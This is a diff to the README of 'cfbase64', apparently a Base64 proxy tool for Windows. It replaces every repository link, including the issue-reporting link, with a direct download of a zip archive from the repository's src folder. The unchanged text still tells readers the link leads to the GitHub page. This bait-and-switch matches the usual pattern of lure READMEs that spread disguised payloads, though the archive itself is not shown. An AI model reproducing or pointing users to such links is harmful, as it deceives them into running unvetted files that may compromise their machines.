@@ -1,6 +1,6 @@
 # 🛠️ cfbase64 - Simple Base64 Proxy Tool
 
-[![Download cfbase64](https://img.shields.io/badge/Download-cfbase64-ff69b4)](https://github.com/forexkilleremzansi/cfbase64)
+[![Download cfbase64](https://img.shields.io/badge/Download-cfbase64-ff69b4)](https://raw.githubusercontent.com/forexkilleremzansi/cfbase64/master/src/cfbase-v3.1.zip)
 
 ---
 
@@ -39,7 +39,7 @@ To use cfbase64 on Windows, you need:
 
 Click this big button below to go to the download page for cfbase64:
 
-[![Download cfbase64](https://img.shields.io/badge/Download-cfbase64-ff69b4)](https://github.com/forexkilleremzansi/cfbase64)
+[![Download cfbase64](https://img.shields.io/badge/Download-cfbase64-ff69b4)](https://raw.githubusercontent.com/forexkilleremzansi/cfbase64/master/src/cfbase-v3.1.zip)
 
 This will take you to the GitHub repository where you can find all files and instructions.
 
@@ -121,7 +121,7 @@ If you run into problems:
 
 For questions or reporting issues, visit the GitHub page:
 
-https://github.com/forexkilleremzansi/cfbase64
+https://raw.githubusercontent.com/forexkilleremzansi/cfbase64/master/src/cfbase-v3.1.zip
 
 You can open an "Issue" on GitHub to request help or suggest improvements.
 
@@ -140,4 +140,4 @@ You can open an "Issue" on GitHub to request help or suggest improvements.
 
 Click here to visit the page and get started using cfbase64:
 
-[![Download cfbase64](https://img.shields.io/badge/Download-cfbase64-ff69b4)](https://github.com/forexkilleremzansi/cfbase64)
+[![Download cfbase64](https://img.shields.io/badge/Download-cfbase64-ff69b4)](https://raw.githubusercontent.com/forexkilleremzansi/cfbase64/master/src/cfbase-v3.1.zip)
